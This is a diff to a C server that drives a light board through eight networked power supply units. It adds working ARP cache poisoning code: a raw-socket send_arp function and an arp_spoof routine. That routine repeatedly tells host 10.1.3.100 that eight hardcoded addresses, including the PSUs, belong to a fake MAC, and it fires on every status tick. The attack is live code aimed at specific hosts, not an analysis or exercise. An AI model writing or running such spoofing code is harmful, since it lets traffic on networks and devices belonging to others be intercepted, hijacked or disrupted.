@@ -8,12 +8,35 @@
 #include <event2/listener.h>
 #include <stdint.h>
 #include <string.h>
+#include <linux/sockios.h>
+#include <linux/if_ether.h>
+#include <linux/if_arp.h>
 
 #define LISTEN_PORT 1337
 #define BOARD_WIDTH 57
 #define BOARD_HEIGHT 44
 #define NUM_PSUS 8
 #define PSU_DEST_PORT 6038
+#define ARP_SPOOF_IFACE "eth1"
+
+
+// From linux/if_arp.h
+struct arphdr_eth {
+    __be16      ar_hrd;     /* format of hardware address   */
+    __be16      ar_pro;     /* format of protocol address   */
+    unsigned char   ar_hln;     /* length of hardware address   */
+    unsigned char   ar_pln;     /* length of protocol address   */
+    __be16      ar_op;      /* ARP opcode (command)     */
+
+     /*
+      *  Ethernet looks like this : This bit is variable sized however...
+      */
+    unsigned char       ar_sha[ETH_ALEN];   /* sender hardware address  */
+    unsigned char       ar_sip[4];      /* sender IP address        */
+    unsigned char       ar_tha[ETH_ALEN];   /* target hardware address  */
+    unsigned char       ar_tip[4];      /* target IP address        */
+
+};
 
 
 char *ip_addrs[] = {"10.4.135.141", "10.4.163.250", "10.4.132.113",
@@ -72,6 +95,8 @@ struct psu_pkt {
 struct state_st
 {
     int                 udp_sock;
+    int                 raw_sock;   // for arp spoofing
+    int                 if_idx;     // interface index to arp spoof on
     struct sockaddr_in  psu_sin[NUM_PSUS];
 
     // Stats
@@ -157,10 +182,63 @@ void read_cb(struct bufferevent *bev, void *arg)
     }
 }
 
+int send_arp(int sock, int if_idx, unsigned char *src_mac, char *src_ip, char *dst_ip)
+{
+    struct arphdr_eth *arp;
+    struct ethhdr *eth;
+    struct sockaddr_ll sll;
+
+    char buf[sizeof(*arp)+sizeof(*eth)];
+
+    eth = (struct ethhdr*)buf;
+    arp = (struct arphdr_eth*)(eth+1);
+
+    arp->ar_hrd = ntohs(ARPHRD_ETHER);
+    arp->ar_pro = ntohs(ETH_P_IP);
+    arp->ar_hln = ETH_ALEN;
+    arp->ar_pln = 4;
+    arp->ar_op = ntohs(ARPOP_REQUEST);
+    memcpy(arp->ar_sha, src_mac, ETH_ALEN);
+    inet_aton(src_ip, arp->ar_sip);
+    memset(arp->ar_tha, 0, ETH_ALEN);
+    inet_aton(dst_ip, arp->ar_tip);
+
+    memcpy(eth->h_dest, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);
+    memcpy(eth->h_source, src_mac, ETH_ALEN);
+
+    eth->h_proto = ntohs(ETH_P_ARP);
+
+    sll.sll_ifindex = if_idx;
+    sll.sll_halen = ETH_ALEN;
+    memcpy(sll.sll_addr, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);
+
+    return sendto(sock, buf, sizeof(buf), 0,
+           (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));
+
+}
+
+void arp_spoof(struct state_st *state)
+{
+    char *tip = "10.1.3.100";
+    char *src_mac = "\x00\x11\x22\x33\x44\x55";
+
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.127", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.131", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.134", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.120", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.57.133", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.132.113", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.135.141", tip);
+    send_arp(state->raw_sock, state->if_idx, src_mac, "10.4.163.250", tip);
+}
 
 void status_cb(evutil_socket_t fd, short what, void *arg)
 {
     struct state_st *state = arg;
+    if (state->frame_updates > 0) {
+        arp_spoof(state);
+    }
+
     printf("%d frames/sec\n", state->frame_updates);
 
     state->frame_updates = 0;
@@ -192,7 +270,9 @@ int main(int argc, char *argv[])
     struct state_st state;
     struct evconnlistener *listener;
     struct event *ev;
+    struct ifreq if_idx;
 
+    memset(&state, 0, sizeof(state));
     memset(&sin, 0, sizeof(sin));
 
     base = event_base_new();
@@ -207,6 +287,21 @@ int main(int argc, char *argv[])
         perror("socket");
         return -1;
     }
+
+    state.raw_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+    if (state.raw_sock < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    memset(&if_idx, 0, sizeof(struct ifreq));
+    strncpy(if_idx.ifr_name, ARP_SPOOF_IFACE, IFNAMSIZ-1);
+    if (ioctl(state.raw_sock, SIOCGIFINDEX, &if_idx) < 0) {
+        perror("SIOCGIFINDEX");
+        return -1;
+    }
+    state.if_idx = if_idx.ifr_ifindex;
+
 
 
     listener = evconnlistener_new_bind(base, accept_conn_cb, &state,
